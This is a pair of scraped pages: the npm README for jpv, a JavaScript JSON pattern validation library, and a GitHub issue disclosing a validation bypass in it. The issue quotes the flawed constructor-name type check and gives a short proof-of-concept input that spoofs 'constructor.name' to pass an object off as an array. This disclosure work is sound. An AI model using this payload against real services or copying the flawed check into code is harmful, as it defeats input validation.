=== Content from www.npmjs.com_96b3ff2f_20250120_231511.html ===

skip to:[content](#main)[package search](#search)[sign in](#signin)â¤

* [Pro](/products/pro)
* [Teams](/products/teams)
* [Pricing](/products)
* [Documentation](https://docs.npmjs.com)
npmSearch[Sign Up](/signup)[Sign In](/login)
## jpv

3.1.2Â â¢Â PublicÂ â¢Â Published 2 years ago

* [Readme](?activeTab=readme)
* [Code Beta](?activeTab=code)
* [0 Dependencies](?activeTab=dependencies)
* [4 Dependents](?activeTab=dependents)
* [28 Versions](?activeTab=versions)

# JPV - JSON Pattern Validation

JPV is an powerful library that makes JSON validation simple and painless, especially when it comes to complex and nested structures. Whether your JSON is just a couple of key-value pairs or a deeply nested, intricate object, JPV provides an elegant and efficient solution for validation.

## Usage

How to use JPV to validate JSON objects:

```
const jpv = require("jpv");

const object = {
  status: "OK",
  meta: {
    age: 30,
  },
};

const pattern = {
  status: /ok/i,
  meta: {
    age: (x) => x > 18,
  },
};

jpv.validate(object, pattern); // true
```

It provides a variety of validation patterns that are both robust and flexible, catering to the exact needs of your data structures. From precise values, regular expressions, and functions to nullable and strict types, JPV has got you covered. Logical operators like and, or, not add another layer of flexibility to meet your precise validation needs.

> **Warning:** JPV 3.0.0 is a significant update from the previous versions of JPV. If you encounter issues with the current version, consider using JPV 2.2.2.

## Installation

To install the library, use npm:

```
npm install jpv
```

Import the library as follows:

```
const { validate, and, or, not, forEach, strict, nullable } = require("jpv");
```

Or, if you prefer ES6 imports:

```
import { validate, and, or, not, forEach, strict, nullable } from "jpv";
```
## Exact values

JPV allows you to specify exact values in your patterns. This means that you can define a specific value that a property in your JSON object must match exactly for the validation to pass.

Exact values can be any valid JavaScript data type, including strings, numbers, booleans, null, and even arrays and objects. This makes exact value validation a very powerful feature when you know exactly what value a property should have.

```
const object = {
  name: "John",
  status: true,
  version: 30,
  city: "New York",
};

const pattern = {
  name: "John",
  status: true,
  version: 30,
};
```
## Regex

Regular expression in JPV is one of the general-purpose patterns that can be used to validate a wide variety of data types.

```
const object = {
  phone: "1234567890",
  name: "John",
};

const pattern = {
  phone: /^\d{10}$/,
  name: new RegExp(/^[A-Za-z]+$/),
};
```
## Arrays

Like a object, arrays are validated by specifying a pattern for each element in the array. The pattern can be any valid JPV pattern, including exact values, regular expressions, functions, and logical operators.

```
const object = ['Lea', '+123456789']

const pattern = [/\w/,  /\+\d/],
```
## Array forEach

To validate each element in an array, you can use the forEach pattern that iterates over each element in the array and validates it against the specified pattern.

```
const object = ["hello", "world", "example"];

const pattern = forEach(/^[a-z]+$/);
```

Another example of using forEach to validate an array of objects:

```
const object = {
  status: "OK",
  data: [
    {
      name: "John",
      age: 21,
    },
    {
      name: "Mark",
      age: 25,
    },
  ],
};

const pattern = {
  status: /ok/i,
  data: forEach({
    name: /^[\w\s]+$/,
    age: x => x > 18,
  }),
};
```
## Functions

JPV allows for function-based validations, offering a high degree of flexibility. This lets you define custom validation logic that goes beyond exact matches and regular expressions. Function-based validations can incorporate complex conditions and external data checks.

Here's an example of function-based validation:

```
const pattern = {
  age: (x) => typeof x === "number" && x > 18,
};
```
## Nullable

In JSON validation, you may come across properties that can be either **`null`** or **`undefined`**, or follow a certain pattern. In such cases, the nullable pattern in JPV comes in handy.

The nullable pattern allows the property value to be either **`null`** or **`undefined`**, or to match the provided condition.

Here's an example:

```
const pattern = {
  address: nullable({
    street: /^[\w\s]+$/,
    city: /^[\w\s]+$/,
    country: /^[\w\s]+$/,
  }),
};
```
## Strict

In strict mode, every key in the JSON object must have a corresponding key in the pattern. If the object has extra keys that are not present in the pattern, validation will fail. Similarly, if the object is missing keys that are present in the pattern, validation will fail. This ensures the object structure precisely mirrors the pattern structure. Samilar requirements are also applied to arrays.

```
const pattern = {
  address: strict({
    street: /^[\w\s]+$/,
    city: /^[\w\s]+$/,
    country: /^[\w\s]+$/,
  }),
};
```
## Operators (and, or, not)

JPV provides three logical operators: **and**, **or**, and **not**. These operators allow you to create complex validation conditions by combining different patterns. Each operator can be used with any type of pattern, offering great flexibility in constructing your validation rules.

```
  and(patternA, patternB, ...)
  or(patternA, patternB, ...)
  not(pattern)
```

Pay attention to arguments, each argument itself can be a pattern or a function that returns a pattern. This allows you to create complex validation rules that can handle a wide variety of scenarios.

```
  and(patternA, or( patternB1, patternB2 ), not(patternC),...)
```

In summary, JPV's logical operators allow for a powerful and flexible way to create complex validation rules that can handle a wide variety of scenarios.

```
const pattern = {
  url: and(/^https:/, not(/^http:/)),
  employeeId: and(not(/^admin$/), (x) => typeof x === "string"),
  emailOrPhone: or(/^\w+@\w+\.\w+$/, /^\d{10}$/),
};
```
## Type validation

To facilitate type validation, we can create a helper function **`is`**. This function accepts a type as a parameter and returns a new function. This returned function, when given a value, compares the type of the value with the expected type, returning a boolean result.

```
const is = (type) => (value) => typeof value === type;

const pattern = {
  name: is("string"),
};
```
# Changlog

This version *(3.x)* of jpv introduces a number of changes from the previous versions (2.x). Here's a summary of the changes:

* Cleaner and more intuitive API.
* New logical operators and, or, not.
* New strict and nullable pattern types.
* Nested object validation.
* forEach pattern for validating arrays.
## Readme

### Keywords

* [json](/search?q=keywords:json)
* [pattern](/search?q=keywords:pattern)
* [validator](/search?q=keywords:validator)
* [operators](/search?q=keywords:operators)
* [strict](/search?q=keywords:strict)
* [schema](/search?q=keywords:schema)
* [regex](/search?q=keywords:regex)
* [array](/search?q=keywords:array)
* [validate](/search?q=keywords:validate)
* [validation](/search?q=keywords:validation)
* [nested](/search?q=keywords:nested)
* [json-schema](/search?q=keywords:json-schema)
## Package Sidebar

### Install

`npm i jpv`

### Repository

[Gitgithub.com/manvel-khnkoyan/jpv](https://github.com/manvel-khnkoyan/jpv)

### Homepage

[github.com/manvel-khnkoyan/jpv#readme](https://github.com/manvel-khnkoyan/jpv#readme)

### DownloadsWeekly Downloads

350

### Version

3.1.2

### License

ISC

### Unpacked Size

55.3 kB

### Total Files

26

### Last publish

2 years ago

### Collaborators

* [![manvel-khnkoyan](/npm-avatar/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdmF0YXJVUkwiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci8xMzgzNWJmMmQyZTU0YzQ3MWRiNGUzMzRkZTBkZTNmYT9zaXplPTEwMCZkZWZhdWx0PXJldHJvIn0.Wk2yH_isDUTATx91KC1se2I1gl0FiHW1oZd0O7AE22A "manvel-khnkoyan")](/~manvel-khnkoyan)
[**Try** on RunKit](https://runkit.com/npm/jpv)[**Report** malware](/support?inquire=security&security-inquire=malware&package=jpv&version=3.1.2)
## Footer

### Support

* [Help](https://docs.npmjs.com)
* [Advisories](https://github.com/advisories)
* [Status](http://status.npmjs.org/)
* [Contact npm](/support)
### Company

* [About](/about)
* [Blog](https://github.blog/tag/npm/)
* [Press](/press)
### Terms & Policies

* [Policies](/policies/)
* [Terms of Use](/policies/terms)
* [Code of Conduct](/policies/conduct)
* [Privacy](/policies/privacy)



=== Content from github.com_cd012905_20250120_231509.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmanvel-khnkoyan%2Fjpv%2Fissues%2F6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmanvel-khnkoyan%2Fjpv%2Fissues%2F6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=manvel-khnkoyan%2Fjpv)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[manvel-khnkoyan](/manvel-khnkoyan)
/
**[jpv](/manvel-khnkoyan/jpv)**
Public

* [Notifications](/login?return_to=%2Fmanvel-khnkoyan%2Fjpv) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fmanvel-khnkoyan%2Fjpv)
* [Star
   10](/login?return_to=%2Fmanvel-khnkoyan%2Fjpv)

* [Code](/manvel-khnkoyan/jpv)
* [Issues
  0](/manvel-khnkoyan/jpv/issues)
* [Pull requests
  0](/manvel-khnkoyan/jpv/pulls)
* [Actions](/manvel-khnkoyan/jpv/actions)
* [Projects
  0](/manvel-khnkoyan/jpv/projects)
* [Security](/manvel-khnkoyan/jpv/security)
* [Insights](/manvel-khnkoyan/jpv/pulse)

Additional navigation options

* [Code](/manvel-khnkoyan/jpv)
* [Issues](/manvel-khnkoyan/jpv/issues)
* [Pull requests](/manvel-khnkoyan/jpv/pulls)
* [Actions](/manvel-khnkoyan/jpv/actions)
* [Projects](/manvel-khnkoyan/jpv/projects)
* [Security](/manvel-khnkoyan/jpv/security)
* [Insights](/manvel-khnkoyan/jpv/pulse)

# A vulnerability in validate() #6

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[A vulnerability in validate()](#top)#6Copy link![@xiaofen9](https://avatars.githubusercontent.com/u/20917869?u=5c2e1010cc9057e642092136074bd2ba5235d351&v=4&size=80)
## Description

![@xiaofen9](https://avatars.githubusercontent.com/u/20917869?u=5c2e1010cc9057e642092136074bd2ba5235d351&v=4&size=48)[xiaofen9](https://github.com/xiaofen9)opened [on Nov 28, 2019](https://github.com/manvel-khnkoyan/jpv/issues/6#issue-530087847)

We found that a maliciously crafted json can bypass the validation logics of jpv.

The vulnerability is from the following code: jpv leverages the built-in constructor of unsafe user-input to detect type information. However, a crafted payload can overwrite this builtin attribute to manipulate the type detection result.

[jpv/index.js](https://github.com/manvel-khnkoyan/jpv/blob/e93d2f68126f837707427ff6019c448611fe1a1b/index.js#L117-L125)

Lines 117 to 125
in
[e93d2f6](/manvel-khnkoyan/jpv/commit/e93d2f68126f837707427ff6019c448611fe1a1b)

|  | if (typeof pattern === 'object') { |
| --- | --- |
|  | if (typeof pattern !== typeof value) { |
|  | return res(false) |
|  | } |
|  | if (pattern !== null && value !== null) { |
|  | return res(value.constructor.name === pattern.constructor.name) |
|  | } |
|  | return res(value === pattern) |
|  | } |

Reproduce Script

```
"use strict";

var jpv = require('jpv');
var path = require('path');
var utils = require("../TestcaseUtils.js");

var user_input = {
    should_be_arrary: {"a":1, 'constructor': {'name':'Array'}}
};
var pattern = {
    should_be_arrary: []
};

console.log(jpv.validate(user_input, pattern));

```
## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


